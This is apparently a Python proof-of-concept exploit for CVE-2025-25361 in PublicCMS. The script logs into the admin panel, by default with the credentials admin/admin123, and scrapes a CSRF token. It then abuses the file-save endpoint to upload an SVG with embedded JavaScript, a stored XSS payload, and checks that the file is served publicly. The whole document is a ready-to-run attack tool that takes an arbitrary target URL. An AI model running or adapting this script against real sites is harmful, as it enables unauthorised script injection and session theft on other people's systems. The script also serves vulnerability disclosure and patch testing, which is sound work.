#!/usr/bin/env python3
import requests
import argparse
import re
import sys
import base64

class CVE202525361:
    def __init__(self, target, username="admin", password="admin123"):
        self.target = target.rstrip("/")
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.csrf_token = None
        
    def login(self):
        login_url = f"{self.target}/admin/login"
        data = {
            "username": self.username,
            "password": self.password,
            "returnUrl": "/admin/"
        }
        resp = self.session.post(login_url, data=data, allow_redirects=True)
        if resp.status_code == 200 and "/admin/" in resp.url and "login" not in resp.url:
            print(f"[+] Login successful as {self.username}")
            return True
        print(f"[-] Login failed - check credentials")
        return False
    
    def get_csrf_token(self):
        list_url = f"{self.target}/admin/cmsWebFile/list"
        resp = self.session.get(list_url)
        match = re.search(r'_csrf=([a-f0-9-]+)', resp.text)
        if match:
            self.csrf_token = match.group(1)
            print(f"[+] Got CSRF token: {self.csrf_token}")
            return True
        print("[-] Failed to get CSRF token")
        return False
    
    def create_malicious_svg(self):
        svg_content = '''<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">
alert('XSS-CVE-2025-25361');
</script>
</svg>'''
        
        encoded_content = base64.b64encode(svg_content.encode()).decode()
        
        save_url = f"{self.target}/admin/cmsWebFile/save"
        data = {
            "path": "poc_xss.svg",
            "content": encoded_content,
            "_csrf": self.csrf_token
        }
        
        resp = self.session.post(save_url, data=data)
        if resp.status_code == 200:
            if "300" in resp.text and "not secure" in resp.text.lower():
                print(f"[-] SVG creation blocked by security check (may be patched version)")
                return False
            print(f"[+] SVG file created successfully via save endpoint")
            return True
        print(f"[-] Create file failed: status={resp.status_code}")
        return False
    
    def verify_exploit(self):
        list_url = f"{self.target}/admin/cmsWebFile/list"
        resp = self.session.get(list_url)
        
        if "poc_xss.svg" in resp.text:
            print(f"[+] poc_xss.svg visible in file list")
            
            file_url = f"{self.target}/webfile/poc_xss.svg"
            resp = self.session.get(file_url)
            if resp.status_code == 200 and "XSS-CVE-2025-25361" in resp.text:
                print(f"[+] Vulnerability confirmed!")
                print(f"[+] Malicious SVG accessible at: {file_url}")
                print(f"[+] File content contains XSS payload")
                return True
            return True
        
        print("[-] File not found in list")
        return False
    
    def run(self):
        print(f"[*] Target: {self.target}")
        print(f"[*] CVE-2025-25361 - PublicCMS Arbitrary File Upload (SVG XSS)")
        print("-" * 60)
        
        if not self.login():
            return False
        
        if not self.get_csrf_token():
            return False
        
        print("[*] Creating malicious SVG file via save endpoint...")
        if self.create_malicious_svg():
            print("-" * 60)
            print("[*] Verifying exploitation...")
            if self.verify_exploit():
                print("[+] Exploitation successful!")
                return True
        
        print("-" * 60)
        print("[!] Exploitation may have failed or version is patched")
        return False

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-25361 - PublicCMS Arbitrary File Upload PoC")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://localhost:8080)")
    parser.add_argument("-u", "--username", default="admin", help="Admin username (default: admin)")
    parser.add_argument("-p", "--password", default="admin123", help="Admin password (default: admin123)")
    
    args = parser.parse_args()
    
    exploit = CVE202525361(args.target, args.username, args.password)
    success = exploit.run()
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
